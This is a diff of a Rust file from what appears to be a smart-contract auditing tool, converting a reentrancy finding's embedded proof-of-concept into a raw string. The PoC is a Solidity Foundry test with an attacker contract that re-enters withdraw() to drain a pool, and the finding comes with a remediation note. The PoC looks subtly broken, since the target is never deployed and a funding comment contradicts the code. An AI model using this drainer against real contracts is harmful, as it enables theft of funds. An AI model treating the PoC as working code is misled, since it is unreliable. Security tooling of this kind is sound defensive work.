@@ -92,55 +92,53 @@ pub fn analyze_contract(target_path_or_source: &Path) -> Result<CopilotReport> {
                 "ExploitContract's fallback intercepts the execution and re-invokes `withdraw()` iteratively until the pool is empty.".into(),
             ],
             remediation: "Apply the Checks-Effects-Interactions (CEI) pattern: update state balances BEFORE transferring value, or use OpenZeppelin's `ReentrancyGuard` with the `nonReentrant` modifier.".into(),
-            poc_test_code: format!(
-r#"// SPDX-License-Identifier: MIT
+            poc_test_code: r#"// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
 import "forge-std/Test.sol";
 
-interface IVulnerable {{
+interface IVulnerable {
     function deposit() external payable;
     function withdraw(uint256 amount) external;
-}}
+}
 
-contract AttackerContract {{
+contract AttackerContract {
     IVulnerable public target;
     uint256 public attackCount;
 
-    constructor(address _target) {{
+    constructor(address _target) {
         target = IVulnerable(_target);
-    }}
+    }
 
-    function attack() external payable {{
-        target.deposit{{value: msg.value}}();
+    function attack() external payable {
+        target.deposit{value: msg.value}();
         target.withdraw(msg.value);
-    }}
+    }
 
-    receive() external payable {{
-        if (address(target).balance >= 1 ether && attackCount < 10) {{
+    receive() external payable {
+        if (address(target).balance >= 1 ether && attackCount < 10) {
             attackCount++;
             target.withdraw(1 ether);
-        }}
-    }}
-}}
+        }
+    }
+}
 
-contract ExploitReentrancyTest is Test {{
+contract ExploitReentrancyTest is Test {
     IVulnerable public target;
     AttackerContract public attacker;
 
-    function setUp() public {{
+    function setUp() public {
         // Setup target contract instance and fund it with 10 ETH
         vm.deal(address(this), 20 ether);
-    }}
+    }
 
-    function testExploitReentrancy() public {{
+    function testExploitReentrancy() public {
         attacker = new AttackerContract(address(target));
         vm.deal(address(attacker), 1 ether);
-        attacker.attack{{value: 1 ether}}();
+        attacker.attack{value: 1 ether}();
         assertGt(address(attacker).balance, 1 ether, "Exploit failed to drain funds");
-    }}
-}}"#
-            ),
+    }
+}"#.to_string(),
         });
     }
 
